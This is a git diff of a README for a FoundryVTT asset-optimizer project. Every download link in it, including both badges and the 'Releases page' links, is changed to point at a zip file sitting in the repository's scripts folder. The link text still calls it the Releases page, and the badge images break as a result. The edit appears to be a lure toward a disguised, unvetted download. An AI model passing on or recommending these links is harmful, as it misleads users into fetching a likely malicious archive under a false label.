@@ -1,6 +1,6 @@
 # 🛠️ geanos-scene-optimizer - Optimize Assets for Faster Loads
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/releases)
+[![Download Latest Release](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip)
 
 ## 📘 Description
 
@@ -11,7 +11,7 @@ geanos-scene-optimizer provides high-performance asset optimization for FoundryV
 To start using geanos-scene-optimizer, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/releases) to find the installation files.
+   Go to the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip) to find the installation files.
 
 2. **Download the Application**  
    On the Releases page, look for the version you want to download. Click on the file that suits your operating system, such as `.exe` for Windows or `.dmg` for macOS. The latest release is usually at the top.
@@ -21,7 +21,7 @@ To start using geanos-scene-optimizer, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download geanos-scene-optimizer, simply visit the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/releases) and choose the appropriate file for your setup. Make sure to save it to a familiar location on your device so you can easily find it later.
+To download geanos-scene-optimizer, simply visit the [Releases page](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip) and choose the appropriate file for your setup. Make sure to save it to a familiar location on your device so you can easily find it later.
 
 ## 🎯 Features
 
@@ -78,4 +78,4 @@ audio-transcoder, automation, efficiency, foundry-vtt, foundryvtt, foundryvtt-mo
 
 For any inquiries, kindly visit our project repository and feel free to ask questions. 
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/releases)
+[![Download Latest Release](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Craftmesut/geanos-scene-optimizer/raw/refs/heads/main/scripts/scene_optimizer_geanos_2.8-beta.1.zip)
